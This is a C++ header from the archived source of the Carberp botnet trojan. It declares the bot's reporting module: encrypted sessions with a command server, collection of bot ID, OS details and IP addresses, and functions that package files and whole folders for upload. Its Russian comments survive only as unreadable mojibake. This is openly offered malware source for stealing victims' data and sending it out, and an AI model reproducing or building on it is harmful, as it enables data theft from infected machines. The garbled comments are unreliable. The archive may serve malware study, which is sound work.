/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
  ���� � �������� �������.
*/
#pragma once

#include "..\common\crypt.h"
#include "..\common\binstorage.h"
#include "..\common\threadsgroup.h"

namespace Report
{
  typedef struct _SERVERSESSION
  {
    LPSTR url; //URL �������.

    /*
      ������� ���������� ��� ������������ �������.

      IN loop    - ����� ������� ��� �������� ����������.
      IN session - ������ ������ �������� � StartServerSession. �� pSession->pPostData - �����
                   ��������� ����� ������������� pSession->pPostData, ������� �� ������ ��������
                   �������� ������ ���� �������, ��� ��������� ����� ���������� ����� �����
                   ���������� �������. ��������� ������� BinStorage::_pack ������.

      Return     - SSPR_*
    */
    typedef int (*REQUESTPROC)(DWORD loop, _SERVERSESSION *session);
    REQUESTPROC requestProc;

    /*
      ������� ���������� ��� ��������� ���������� ������� (������ �������). ���������� ������ �
      ������ ��������� ���������� BinStorage::_unpack ��� ������ �������.

      IN loop    - ����� ������� ��� �������� ����������.
      IN session - ������ ������ �������� � StartServerSession. �� pSession->pPostData - �����
                   ��������� ����� ������� (��� ����������� BinStorage::_unpack). ��������� �����
                   ��������� ����� ����� ������ �� ���� �������.

      Return     - SSPR_*
    */
    typedef int (*RESULTPROC)(DWORD loop, _SERVERSESSION *session);
    RESULTPROC resultProc;

    HANDLE stopEvent; //������ ����������.

    //������ � ����� ���������� ��� pPostData. ���� �� ����� ������� � ���� ��������� ��������.
    Crypt::RC4KEY *rc4Key;

    BinStorage::STORAGE *postData; //���� ������ ��� �������. ��� �������� �� _Run ����� ���� ��� NULL,
                                   //��� ��� � ���������. �� �� ����� BinStorage::_pack!

    void *customData; //��������������� ������ ��� ������� �������.
  }SERVERSESSION;

  //���� ������ ��� REQUESTPROC.
  enum
  {
    SSPR_CONTUNUE, //���������� �����������.
    SSPR_END,      //������ ���������.
    SSPR_ERROR     //������ ��������� � �������.
  };

  //�������� ���� ���������� ��� ���������� � ���.
  enum
  {
    BIF_BOT_ID       = 0x01, //���������� BOTID � ������.
    BIF_BOT_VERSION  = 0x02, //���������� ������ ����.
    BIF_TIME_INFO    = 0x04, //���������� ������ � �������.
    BIF_OS           = 0x08, //���������� ���������� �� OS.
    BIF_PROCESS_FILE = 0x10, //���� ��������.
    BIF_IP_ADDRESSES = 0x20  //������ IP-�������.
  };

  //����� ��� writeFolderAsArchive.
  enum
  {
    WFAA_RECURSE = 0x1 //��������� �������������.
  };

  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ���������� ������� ���������� � �����.

    IN OUT binStorage - �����������(�����). ���� �� ����� *pph == NULL, �� ������� ������� �����
                        ������������
    IN flags          - ����� BIF_*.

    Return            - true - � ������ ������, 
                        false - � ������ ������.
  */
  bool addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags);

  /*
    ������� �������, �������� ������������� �������� ������� �� ������.

    IN group - ������ �������.

    Return   - true - � ������ ������, 
               false - � ������ ������.
  */
  bool _create(ThreadsGroup::GROUP *group);

  /*
    ������ ������ � ��������.

    IN session - ������. 

    Return     - true - � ������ ��������� ���������� ������ (����������, ������������ �������,
                 �������� SSPR_END �� *_PROC)
                 false - � ����� ������ ������.
  */
  bool startServerSession(SERVERSESSION *session);

  /*
    ������ ������ � ����� (������� ������ ������� ������).

    IN type       - ��� ���� BLT_*.
    IN sourcePath - �������� ���� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN destPath   - ���� ���������� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN data       - ������.
    IN dataSize   - ������ ������.

    Return        - true - � ������ ������, 
                    false - � ������ ������.
  */
  bool writeData(DWORD type, LPWSTR sourcePath, LPWSTR destPath, void *data, DWORD dataSize);

  /*
    ������ IStream ������ � �����.

    IN type       - ��� ���� BLT_*.
    IN sourcePath - �������� ���� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN destPath   - ���� ���������� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN data       - ������.

    Return        - true - � ������ ������, 
                    false - � ������ ������.
  */
  bool writeIStream(DWORD type, LPWSTR sourcePath, LPWSTR destPath, IStream *data);

  /*
    ������ � ��� ������.

    IN type       - ��� ���� BLT_*.
    IN sourcePath - �������� ���� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN destPath   - ���� ���������� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN string     - ������.

    Return        - true - � ������ ������, 
                    false - � ������ ������.
  */
  bool writeString(DWORD type, LPWSTR sourcePath, LPWSTR destPath, LPWSTR string);
    
  /*
    ������ � ��� ������ �� �������.

    IN type       - ��� ���� BLT_*.
    IN sourcePath - �������� ���� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN destPath   - ���� ���������� ��� NULL. ������ ������������ ��� ������ BLT_FILE.
    IN format     - ������ ������.
    IN ...        - ���������.

    Return        - true - � ������ ������, 
                    false - � ������ ������.
  */
  bool writeStringFormat(DWORD type, LPWSTR sourcePath, LPWSTR destPath, LPWSTR format, ...);

  /*
    ������ ����� � �����.

    IN file       - �������� ����.
    IN sourcePath - �������� ����, ���� ������� NULL, �� ����� �������������� file.
    IN destPath   - ���� ���������� ��� NULL.

    Return        - true - � ������ ������, 
                    false - � ������ ������.
  */
  bool writeFile(LPWSTR file, LPWSTR sourcePath, LPWSTR destPath);
  
  /*
    ������ �����(� ����������) � ����� � ���� ������.

    IN path          - �������� �����.
    IN fileMask      - ������ ����� ������.
    IN fileMaskCount - ���. ��������� � fileMask.
    IN destPath      - ���� ���������� ��� NULL.
    IN flags         - ����� WFAA_*.

    Return           - true - � ������ ������, 
                       false - � ������ ������.
  */
  bool writeFolderAsArchive(LPWSTR path, LPWSTR *fileMask, DWORD fileMaskCount, LPWSTR destPath, DWORD flags);
};
